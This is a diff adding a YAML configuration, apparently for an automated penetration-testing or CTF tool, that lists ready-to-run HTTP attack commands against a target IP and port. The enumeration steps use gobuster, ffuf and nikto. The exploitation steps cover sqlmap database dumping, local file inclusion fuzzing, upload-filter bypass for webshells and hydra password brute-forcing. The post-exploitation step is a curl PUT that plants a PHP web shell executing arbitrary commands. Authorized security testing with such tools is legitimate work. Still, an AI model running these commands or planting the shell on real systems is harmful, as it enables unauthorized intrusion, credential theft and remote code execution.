@@ -1,0 +1,54 @@
+service: http
+ports: [80, 443, 8080, 8443, 8000]
+categories:
+  enumeration:
+    - id: http_whatweb
+      description: "Fingerprint web technology"
+      command: "whatweb http://{IP}:{PORT}"
+      priority: high
+    - id: http_nikto
+      description: "Nikto vulnerability scan"
+      command: "nikto -h http://{IP}:{PORT}"
+      priority: medium
+    - id: http_dirb
+      description: "Directory brute force (gobuster)"
+      command: "gobuster dir -u http://{IP}:{PORT} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt"
+      priority: high
+    - id: http_vhost
+      description: "Virtual host enumeration"
+      command: "gobuster vhost -u http://{IP} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
+      priority: medium
+    - id: http_ffuf_files
+      description: "Fuzz for files"
+      command: "ffuf -u http://{IP}:{PORT}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt"
+      priority: high
+    - id: http_source
+      description: "Check page source for comments/paths"
+      command: "curl -s http://{IP}:{PORT}/ | grep -i '<!--\\|TODO\\|password\\|api'"
+      priority: high
+    - id: http_robots
+      description: "Check robots.txt and sitemap"
+      command: "curl -s http://{IP}:{PORT}/robots.txt; curl -s http://{IP}:{PORT}/sitemap.xml"
+      priority: high
+  exploitation:
+    - id: http_sqli
+      description: "Test for SQL injection (sqlmap)"
+      command: "sqlmap -u 'http://{IP}:{PORT}/page?id=1' --batch --dbs"
+      priority: high
+    - id: http_lfi
+      description: "Test Local File Inclusion"
+      command: "ffuf -u 'http://{IP}:{PORT}/page?file=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt"
+      priority: high
+    - id: http_upload
+      description: "Test file upload bypass"
+      command: "# Upload webshell with various extensions: .php, .phtml, .php5, .phar"
+      priority: medium
+    - id: http_default_creds
+      description: "Try default credentials on login"
+      command: "hydra -L users.txt -P passwords.txt {IP} http-post-form '/login:user=^USER^&pass=^PASS^:F=failed'"
+      priority: high
+  post_exploitation:
+    - id: http_webshell
+      description: "Deploy web shell if writable"
+      command: "curl -X PUT http://{IP}:{PORT}/shell.php -d '<?php system($_GET[\"cmd\"]); ?>'"
+      priority: medium
